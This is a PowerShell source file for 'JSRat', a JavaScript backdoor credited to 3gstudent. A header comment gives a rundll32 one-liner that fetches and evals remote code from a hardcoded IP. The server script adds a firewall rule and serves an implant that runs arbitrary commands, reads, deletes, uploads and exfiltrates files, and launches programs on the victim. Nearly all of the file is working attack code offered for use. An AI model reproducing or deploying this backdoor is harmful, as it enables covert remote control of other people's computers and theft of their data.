<#
  ---  
  Learn from  Casey Smith @subTee
  Author: 3gstudent
  ---
  Javascript Backdoor
  ---
  Server:
  run as admin:
    powershell.exe -ExecutionPolicy Bypass -File c:\test\JSRat.ps1
    
  Client:  
  cmd line:  
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
 
  
#>

$Server = '192.168.174.131' #Listening IP. Change This.

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
    
    
 
     
    
    
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Usage:" -fore Green
     write-host "      cmd:          just input the cmd command" -fore Green
     write-host "      delete file:  input:delete,then set the file path" -fore Green
     write-host "      exitbackdoor: input:exit" -fore Green
     write-host "      read file:    input:read,then set the file path" -fore Green
     write-host "      run exe:      input:run,then set the file path" -fore Green
     write-host "      download file:      input:down,then set the file path" -fore Green
     write-host "      upload file:      input:upload,then set the file path" -fore Green
     
     write-host "Host Connected" -fore Cyan
        $message = '
					
					
					while(true)
					{
						h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        h.SetTimeouts(0, 0, 0, 0);
						
                        try
                        {
					       	h.Open("GET","http://'+$Server+'/rat",false);
						    h.Send();
						    c = h.ResponseText;
                            
                            
                            if(c=="delete")

                            {
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Next Input should be the File to Delete]");
                                
                                g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g.SetTimeouts(0, 0, 0, 0);
                                g.Open("GET","http://'+$Server+'/rat",false);
					    	    g.Send();
					    	    d = g.ResponseText;

                                fso1=new ActiveXObject("Scripting.FileSystemObject");
                                f =fso1.GetFile(d);
                                f.Delete();
                                
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Delete Success]");
                                continue;                         
                          
                            }
                            
                            else if(c=="download")
                            {
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Next Input should be the File to download]");
                                
                                g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g.SetTimeouts(0, 0, 0, 0);
                                g.Open("GET","http://'+$Server+'/rat",false);
					    	    g.Send();
					    	    d = g.ResponseText;

                                fso1=new ActiveXObject("Scripting.FileSystemObject");
                                f=fso1.OpenTextFile(d,1);
                                g=f.ReadAll();
                                f.Close(); 
                              



                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/download",false);
					    	    p.Send(g);
                                continue;
                            }
                           
                            else if(c=="exit")
                            {
                                c="(\"cmd /c taskkill /f /im rundll32.exe\",,0,true)";  
                                r = new ActiveXObject("WScript.Shell").Run(c);
                       
                            }
                            
                            else if(c=="read")
                            {
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Next Input should be the File to Read]");
                                
                                g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g.SetTimeouts(0, 0, 0, 0);
                                g.Open("GET","http://'+$Server+'/rat",false);
					    	    g.Send();
					    	    d = g.ResponseText;

                                fso1=new ActiveXObject("Scripting.FileSystemObject");
                                f=fso1.OpenTextFile(d,1);
                                g=f.ReadAll();
                                f.Close();

                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send(g);
                                continue;
                            }
                                       
                            
                            else if(c=="run")
                            {
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Next Input should be the File to Run]");
                                
                                g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g.SetTimeouts(0, 0, 0, 0);
                                g.Open("GET","http://'+$Server+'/rat",false);
					    	    g.Send();
					    	    d = g.ResponseText;

                                
                                r = new ActiveXObject("WScript.Shell").Run(d,0,true);
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
                                p.Send("[Run Success]");
                                
                                
                                continue;      
                            }
                          
                          
                           else if(c=="upload")
                            {
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Start to Upload]");
                                
                                g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g.SetTimeouts(0, 0, 0, 0);
                                g.Open("GET","http://'+$Server+'/uploadpath",false);
					    	    g.Send();
					    	    dpath = g.ResponseText;
                          
                                g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                g2.SetTimeouts(0, 0, 0, 0);
                                g2.Open("GET","http://'+$Server+'/uploaddata",false);
					    	    g2.Send();
					    	    ddata = g2.ResponseText;

                                fso1=new ActiveXObject("Scripting.FileSystemObject");
                                f=fso1.CreateTextFile(dpath,true);
                                f.WriteLine(ddata);
                                f.Close();
                                    
                                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                p.SetTimeouts(0, 0, 0, 0);
					    	    p.Open("POST","http://'+$Server+'/rat",false);
					    	    p.Send("[Upload Success]");
                                continue;
                            }
                            
                            else
                            {
                            
                            r = new ActiveXObject("WScript.Shell").Exec(c);
				    		var so;
				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						    p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				    		p.Open("POST","http://'+$Server+'/rat",false);
			 	       		p.Send(so);
                            }
                            
                        }
                        catch(e1)
                        {
                            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                            p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://'+$Server+'/rat",false);
                            p.Send("[No Output]");
                            
					    }
                                            
					}
					
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    
    
    if ($request.Url -match '/download$' -and ($request.HttpMethod -eq "POST") ) { 
	   $output = ""
       $size = $Request.ContentLength64 + 1   
       $buffer = New-Object byte[] $size
       do {
            $count = $Request.InputStream.Read($buffer, 0, $size)
            $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
          } until($count -lt $size)
       $Request.InputStream.Close()
             
       write-host "Input the Path to Save:" -fore Red
       $message = Read-Host
	   Set-Content $message -Value $output
       write-host "Save Success" -fore Red
    
    }
    
    
    
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "JS $hostip>"		
    }
        	
    if($BoolExit -eq 1)
    {
        exit      
    }   	
    $BoolExit=0

    if($message  -eq "exit")
    {
        $BoolExit=1
    }   



    if ($request.Url -match '/uploadpath$' -and ($request.HttpMethod -eq "GET") ) {
    
        write-host "Input the Path to upload:" -fore Red
        $UploadPath = Read-Host 
        write-host "Input the Destination Path:" -fore Red
        $message = Read-Host 
      
    }


    if ($request.Url -match '/uploaddata$' -and ($request.HttpMethod -eq "GET") ) {

        $message = Get-Content $UploadPath
    }

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
